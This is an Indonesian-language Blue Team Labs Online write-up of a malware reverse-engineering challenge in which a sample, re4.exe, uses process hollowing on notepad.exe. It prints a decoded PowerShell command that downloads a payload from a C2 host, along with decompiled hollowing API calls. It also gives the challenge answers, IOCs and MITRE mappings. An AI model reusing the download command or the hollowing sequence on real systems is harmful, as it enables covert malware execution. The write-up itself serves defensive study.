# Injection Series Part 4 — BTLO

> **Platform:** Blue Team Labs Online  
> **Category:** Malware Analysis / Reverse Engineering  
> **Difficulty:** Medium  
> **Status:** ✅ Completed  
> **Date:** 2026-05-07  
> **Time Spent:** ~2 jam  

---

## 📌 Prolog

Challenge ke-4 dari Injection Series di BTLO. Kali ini fokus ke static analysis file `re4.exe` menggunakan disassembler (IDA/Ghidra) untuk memahami teknik injeksi yang dipakai. File ini ternyata mengimplementasikan **Process Hollowing** — salah satu teknik stealth yang cukup populer di malware modern karena bisa bersembunyi di balik nama proses legitimate.

---

## 🎯 Scenario

Lakukan reverse engineering terhadap file yang diberikan dan pahami perilakunya. Bisa menggunakan disassembler apapun untuk menyelesaikan challenge ini.

**Sample:** `Sample.zip` (password: `BTLO`) → ekstrak → `re4.exe`  
**Tools:** IDA / Ghidra

---

## ❓ Questions

1. What was the first process that was spawned and what API was used to spawn it?
2. The API used has a parameter with the value 4, what does the value 4 mean?
3. What domain does the malware contact?
4. What PowerShell cmdlet was used to download the file and what is the full path where the file will be saved?
5. After the file is downloaded, what function from `ntdll` is invoked?
6. What are the two APIs used to update the entry point and resume the thread?
7. What is the MITRE ID for the technique used?

---

## 🔍 Answer & Walkthrough

### 1. What was the first process that was spawned and what API was used?

Load `re4.exe` ke Ghidra/IDA. Di fungsi `main` (`FUN_00401000`), langsung ketemu call ke `CreateProcessA` dengan hardcoded path:

```c
CreateProcessA(NULL, "c:\\windows\\syswow64\\notepad.exe", ..., CREATE_SUSPENDED, ...)
```

**Jawaban:** `notepad.exe, CreateProcessA`

---

### 2. What does the value 4 in the API parameter mean?

Parameter `dwCreationFlags` di `CreateProcessA` diisi nilai `4`. Nilai ini adalah flag `CREATE_SUSPENDED` — proses di-spawn dalam kondisi frozen/suspended supaya malware punya waktu untuk memanipulasi memory-nya sebelum thread berjalan.

**Jawaban:** `CREATE_SUSPENDED`

---

### 3. What domain does the malware contact?

Ada PowerShell command yang dijalankan malware dengan flag `-enc <base64>`. Decode base64-nya pakai CyberChef:

> Recipe: `From Base64` → `Decode Text (UTF-16LE)`

Hasilnya:

```
Invoke-WebRequest -Uri http://somec2.server/exp.exe -OutFile c:\windows\temp\exp.exe
```

**Jawaban:** `somec2.server`

---

### 4. What PowerShell cmdlet was used and what is the full save path?

Dari decoded command di atas, cmdlet yang dipakai adalah `Invoke-WebRequest`. File di-save ke path:

```
C:\windows\temp\exp.exe
```

PowerShell dijalankan dengan flag `-windowstyle hidden` supaya window tidak muncul.

**Jawaban:** `Invoke-WebRequest, C:\windows\temp\exp.exe`

---

### 5. What ntdll function is invoked after the download?

Setelah `exp.exe` di-download, malware resolve fungsi `NtUnmapViewOfSection` secara dinamis lewat `GetProcAddress`:

```c
lpProcName = "NtUnmapViewOfSection";
hModule = GetModuleHandleA("ntdll");
pFVar7 = GetProcAddress(hModule, lpProcName);
(*pFVar7)(hProcess, local_18);
```

Fungsi ini dipakai untuk **menghapus memory image** notepad yang asli sebelum payload di-inject — ini inti dari teknik Process Hollowing.

**Jawaban:** `NtUnmapViewOfSection`

---

### 6. What are the two APIs used to update the entry point and resume the thread?

Setelah payload ditulis ke memory notepad lewat `WriteProcessMemory`, malware update entry point dan resume thread:

```c
lpContext->Eax = *(int *)((int)lpBuffer + iVar1 + 0x28) + (int)local_18;
SetThreadContext(lpProcessInformation->hThread, lpContext);
ResumeThread(lpProcessInformation->hThread);
```

`SetThreadContext` mengarahkan register EAX ke entry point payload. `ResumeThread` menjalankan thread — tapi yang jalan sekarang bukan notepad, melainkan `exp.exe`.

**Jawaban:** `SetThreadContext, ResumeThread`

---

### 7. What is the MITRE ID for the technique used?

Teknik yang digunakan adalah **Process Hollowing** — spawn proses legitimate, hollow memory-nya, inject payload, resume. Terdaftar di MITRE ATT&CK sebagai sub-technique dari Process Injection.

**Jawaban:** `T1055.012`

---

## 🚨 Key Findings / IOCs

| Tipe | Value | Keterangan |
|------|-------|------------|
| Domain | `somec2.server` | C2 server tempat payload didownload |
| URL | `http://somec2.server/exp.exe` | Download URL payload second-stage |
| File Path | `C:\windows\temp\exp.exe` | Lokasi payload setelah didownload |
| Process | `notepad.exe` | Proses legitimate yang di-hijack |

---

## 🗺️ MITRE ATT&CK Mapping

| Tactic | Technique | ID | Keterangan |
|--------|-----------|----|------------|
| Defense Evasion | Process Injection: Process Hollowing | T1055.012 | Payload berjalan di balik proses notepad.exe |
| Execution | Command and Scripting Interpreter: PowerShell | T1059.001 | PowerShell `-enc` untuk download payload |
| Command and Control | Application Layer Protocol | T1071 | HTTP request ke C2 server |

---

## 📋 Summary — Attacker Behavior & Todo

### Attacker Behavior

`re4.exe` berperan sebagai **stager/dropper**. Alur eksekusinya:

1. Spawn `notepad.exe` dalam kondisi suspended
2. Query PEB notepad lewat `NtQueryInformationProcess` untuk dapat ImageBase
3. Jalankan PowerShell tersembunyi untuk download `exp.exe` dari C2 (`somec2.server`)
4. Baca `exp.exe` ke heap memory
5. Hollow out notepad lewat `NtUnmapViewOfSection`
6. Alokasi memory baru di proses notepad, tulis payload `exp.exe` ke sana
7. Update entry point via `SetThreadContext`, resume thread via `ResumeThread`
8. Notepad sekarang menjalankan `exp.exe` — kemungkinan second-stage payload (reverse shell/persistence)

Teknik ini efektif karena payload hanya ada di RAM, tidak ada proses baru yang dibuat — traffic monitoring sederhana hanya akan melihat `notepad.exe`.

### Todo / Follow-up

- [ ] Analisis `exp.exe` (second-stage payload) — apa yang dilakukan setelah koneksi ke C2 berhasil?
- [ ] Pelajari cara EDR modern mendeteksi Process Hollowing (misalnya: monitoring `NtUnmapViewOfSection` + `WriteProcessMemory` pattern)
- [ ] Eksperimen dengan Sysmon rules untuk catch teknik ini di lab environment
- [ ] Bandingkan dengan Process Doppelgänging (T1055.013) — evolusi dari teknik yang sama

---

## 📚 References

- [MITRE ATT&CK — T1055.012: Process Hollowing](https://attack.mitre.org/techniques/T1055/012/)
- [MITRE ATT&CK — T1059.001: PowerShell](https://attack.mitre.org/techniques/T1059/001/)
- [How Process Hollowing Works](https://www.ired.team/offensive-security/code-injection-process-injection/process-hollowing-and-pe-image-relocations)

---

*Writeup ini dibuat sebagai bagian dari perjalanan belajar Blue Team / SOC Analyst.*
